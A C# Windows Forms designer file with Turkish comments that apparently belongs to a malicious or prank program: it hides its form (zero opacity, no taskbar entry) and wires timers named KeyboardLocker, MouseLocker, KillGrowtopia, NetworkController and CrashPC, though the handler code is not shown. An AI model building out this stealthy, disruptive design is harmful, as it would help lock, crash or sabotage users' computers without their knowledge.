namespace Maxidatter
{
    partial class Form1
    {
        /// <summary>
        ///Gerekli tasarımcı değişkeni.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///Kullanılan tüm kaynakları temizleyin.
        /// </summary>
        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer üretilen kod

        /// <summary>
        /// Tasarımcı desteği için gerekli metot - bu metodun 
        ///içeriğini kod düzenleyici ile değiştirmeyin.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.timer3 = new System.Windows.Forms.Timer(this.components);
            this.NetworkController = new System.Windows.Forms.Timer(this.components);
            this.KeyboardLocker = new System.Windows.Forms.Timer(this.components);
            this.MouseLocker = new System.Windows.Forms.Timer(this.components);
            this.KillGrowtopia = new System.Windows.Forms.Timer(this.components);
            this.CrashPC = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Interval = 3600000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // timer2
            // 
            this.timer2.Interval = 100000;
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // timer3
            // 
            this.timer3.Interval = 600000;
            this.timer3.Tick += new System.EventHandler(this.timer3_Tick);
            // 
            // NetworkController
            // 
            this.NetworkController.Tick += new System.EventHandler(this.NetworkController_Tick);
            // 
            // KeyboardLocker
            // 
            this.KeyboardLocker.Tick += new System.EventHandler(this.KeyboardLocker_Tick);
            // 
            // MouseLocker
            // 
            this.MouseLocker.Tick += new System.EventHandler(this.MouseLocker_Tick);
            // 
            // KillGrowtopia
            // 
            this.KillGrowtopia.Interval = 1000;
            this.KillGrowtopia.Tick += new System.EventHandler(this.KillGrowtopia_Tick);
            // 
            // CrashPC
            // 
            this.CrashPC.Tick += new System.EventHandler(this.CrashPC_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(79, 29);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.Opacity = 0D;
            this.ShowInTaskbar = false;
            this.Text = "Form1";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Timer timer2;
        private System.Windows.Forms.Timer timer3;
        private System.Windows.Forms.Timer NetworkController;
        private System.Windows.Forms.Timer KeyboardLocker;
        private System.Windows.Forms.Timer MouseLocker;
        private System.Windows.Forms.Timer KillGrowtopia;
        private System.Windows.Forms.Timer CrashPC;
    }
}

